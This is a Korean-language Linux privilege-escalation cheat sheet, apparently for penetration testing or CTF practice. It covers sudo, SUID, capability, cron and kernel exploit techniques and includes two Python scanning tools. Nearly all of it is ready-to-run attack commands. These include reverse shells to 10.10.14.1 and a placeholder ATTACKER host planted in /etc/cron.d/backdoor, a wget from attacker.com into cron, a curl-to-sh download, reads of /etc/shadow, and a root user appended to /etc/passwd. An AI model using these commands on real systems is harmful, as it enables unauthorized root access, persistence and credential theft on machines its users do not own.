# Linux 권한 상승 — sudo·SUID·Capabilities·커널 익스플로잇

## 1. 권한 상승 체크리스트

```bash
# LinPEAS 자동 열거 (최우선)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 수동 열거 순서
whoami && id                              # 현재 권한
cat /etc/passwd | grep sh$               # 로그인 가능 사용자
sudo -l                                  # sudo 허용 명령어
find / -perm -4000 -type f 2>/dev/null   # SUID 파일
find / -perm -2000 -type f 2>/dev/null   # SGID 파일
getcap -r / 2>/dev/null                  # Capabilities
cat /etc/crontab; ls /etc/cron*          # Cron 작업
ss -tlnp; netstat -tlnp                  # 내부 리스닝 포트
uname -r; cat /etc/*release              # 커널 버전
```

---

## 2. sudo 악용

### 2.1 GTFOBins 기반

```bash
# sudo -l 결과 예시
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# find
sudo find / -exec /bin/bash -p \; -quit

# python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# wget — 파일 쓰기로 cron 추가
sudo wget http://attacker.com/evil -O /etc/cron.d/backdoor

# apt-get
sudo apt-get changelog apt  # 실행 후 !bash
```

### 2.2 sudo 버전 취약점

```bash
# CVE-2021-3156 — sudo heap overflow (sudo < 1.9.5p2)
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# 익스플로잇: https://github.com/blasty/CVE-2021-3156

# CVE-2019-14287 — sudo -u#-1 (sudo < 1.8.28)
sudo -u#-1 /bin/bash
```

---

## 3. SUID 바이너리 악용

```python
#!/usr/bin/env python3
"""SUID/SGID 바이너리 자동 분석 — GTFOBins 매칭 CLI."""

import argparse
import os
import stat
import subprocess
from pathlib import Path


GTFOBINS_SUID = {
    "bash": "bash -p",
    "vim": "vim -c ':!/bin/bash -p'",
    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "perl": "perl -e 'use POSIX (setuid); setuid(0); exec \"/bin/bash -p\"'",
    "find": "find / -exec /bin/bash -p \\; -quit",
    "nmap": "nmap --interactive  # (구버전)",
    "cp": "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p",
    "tee": "echo 'user:$(python3 -c \"import crypt; print(crypt.crypt(\\\"pass\\\"))\"):0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
    "awk": "awk 'BEGIN {system(\"/bin/bash -p\")}'",
    "less": "less /etc/passwd  # 실행 후 !bash -p",
    "more": "more /etc/passwd  # 실행 후 !bash -p",
    "dd": "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' | dd of=/etc/cron.d/backdoor",
    "nano": "nano  # 실행 후 ^R^X, reset; sh 1>&0 2>&0",
    "cat": "LFILE=/etc/shadow; cat $LFILE",
    "curl": "curl file:///etc/shadow",
}


def find_suid_files(search_path: str = "/") -> list[Path]:
    suid_files = []
    for root, dirs, files in os.walk(search_path, onerror=lambda e: None):
        dirs[:] = [d for d in dirs if d not in {"proc", "sys", "dev"}]
        for fname in files:
            fpath = Path(root) / fname
            try:
                mode = fpath.stat().st_mode
                if mode & stat.S_ISUID:
                    suid_files.append(fpath)
            except (PermissionError, OSError):
                pass
    return suid_files


def analyze_suid(suid_files: list[Path]) -> list[dict]:
    results = []
    for fpath in suid_files:
        name = fpath.name
        exploit = GTFOBINS_SUID.get(name)
        results.append({
            "path": str(fpath),
            "name": name,
            "known_exploit": bool(exploit),
            "exploit_cmd": exploit or "미발견 — GTFOBins 직접 확인",
        })
    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="SUID 바이너리 분석")
    parser.add_argument("--path", default="/", help="검색 경로")
    parser.add_argument("--exploitable-only", action="store_true")
    args = parser.parse_args()

    print(f"[*] SUID 파일 탐색 중: {args.path}")
    suid_files = find_suid_files(args.path)
    results = analyze_suid(suid_files)

    if args.exploitable_only:
        results = [r for r in results if r["known_exploit"]]

    print(f"\n발견 {len(suid_files)}개 / 익스플로잇 가능 {sum(r['known_exploit'] for r in results)}개\n")
    for r in results:
        icon = "[!]" if r["known_exploit"] else "[ ]"
        print(f"{icon} {r['path']}")
        if r["known_exploit"]:
            print(f"    → {r['exploit_cmd']}")


if __name__ == "__main__":
    main()
```

---

## 4. Capabilities 악용

```bash
# Capabilities 열거
getcap -r / 2>/dev/null

# 위험한 Capabilities
# cap_setuid+ep  — setuid() 호출 가능
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# cap_net_raw+ep — raw 소켓 (패킷 스니핑)
tcpdump -i any -w /tmp/capture.pcap

# cap_dac_read_search+ep — 파일 읽기 권한 무시
./tar cf /dev/null /root/.ssh/id_rsa  # 읽기 성공

# cap_fowner+ep — 파일 소유권 무시
chmod 777 /etc/shadow
```

---

## 5. Cron 작업 악용

```bash
# cron 파일 쓰기 가능 여부
ls -la /etc/cron* /var/spool/cron/

# cron.d에 쓰기 가능하면 역쉘 추가
echo '* * * * * root bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' \
  > /etc/cron.d/backdoor

# PATH 조작 — cron 스크립트가 상대 경로로 실행하는 경우
cat /etc/crontab  # PATH 확인
echo '#!/bin/bash' > /usr/local/bin/vulnerable_script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/vulnerable_script
chmod +x /usr/local/bin/vulnerable_script

# 와일드카드 인젝션 — cron에서 tar * 사용 시
touch /var/backup/--checkpoint=1
touch /var/backup/--checkpoint-action=exec=sh\ shell.sh
```

---

## 6. 커널 익스플로잇

```bash
# 커널 버전 확인
uname -r
cat /proc/version

# 취약한 커널 버전 확인
# CVE-2022-0847 (DirtyPipe) — Linux 5.8~5.16.11
python3 dirtypipe.py /etc/passwd  # /etc/passwd에 root 쉘 추가

# CVE-2021-4034 (PwnKit) — pkexec < 0.120
./PwnKit  # GLIBC 없는 정적 바이너리

# CVE-2016-5195 (DirtyCow) — Linux < 4.8.3
./dcow /etc/passwd

# 자동 커널 익스플로잇 탐색
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.py
```

```python
#!/usr/bin/env python3
"""Linux 권한 상승 자동 체크 CLI."""

import argparse
import os
import subprocess
import re
from pathlib import Path


def check_sudo_permissions() -> list[str]:
    try:
        result = subprocess.run(
            ["sudo", "-l"], capture_output=True, text=True, timeout=5
        )
        return result.stdout.splitlines()
    except Exception:
        return []


def check_writable_paths() -> list[str]:
    dangerous_paths = [
        "/etc/cron.d", "/etc/crontab", "/etc/cron.hourly",
        "/etc/passwd", "/etc/shadow", "/etc/sudoers",
        "/var/spool/cron", "/tmp",
    ]
    writable = []
    for path in dangerous_paths:
        if os.access(path, os.W_OK):
            writable.append(path)
    return writable


def check_env_variables() -> dict:
    interesting = {}
    for key, val in os.environ.items():
        if any(k in key.upper() for k in ["PATH", "LD_", "PYTHONPATH", "HOME"]):
            interesting[key] = val
    return interesting


def get_kernel_version() -> str:
    result = subprocess.run(["uname", "-r"], capture_output=True, text=True)
    return result.stdout.strip()


def main() -> None:
    parser = argparse.ArgumentParser(description="Linux 권한 상승 자동 체크")
    parser.add_argument("--all", action="store_true", help="전체 체크 실행")
    args = parser.parse_args()

    print(f"[*] 현재 사용자: {os.getenv('USER', 'unknown')} (UID={os.getuid()})")
    print(f"[*] 커널 버전: {get_kernel_version()}")

    print("\n[*] sudo 권한 확인...")
    sudo_perms = check_sudo_permissions()
    for line in sudo_perms:
        if "NOPASSWD" in line or "ALL" in line:
            print(f"  [!] {line.strip()}")

    print("\n[*] 쓰기 가능한 민감 경로...")
    writable = check_writable_paths()
    for path in writable:
        print(f"  [!] {path}")

    print("\n[*] 환경 변수...")
    for k, v in check_env_variables().items():
        print(f"  {k}={v}")


if __name__ == "__main__":
    main()
```

---

## 7. 참고 도구

| 도구 | 용도 |
|------|------|
| `LinPEAS` | 자동 열거·권한 상승 벡터 탐색 |
| `linux-exploit-suggester` | 커널 취약점 제안 |
| `GTFOBins` | SUID/sudo 바이너리 악용 DB |
| `pspy` | 프로세스 감시 (cron 탐지) |
| `linenum.sh` | 권한 상승 체크리스트 |
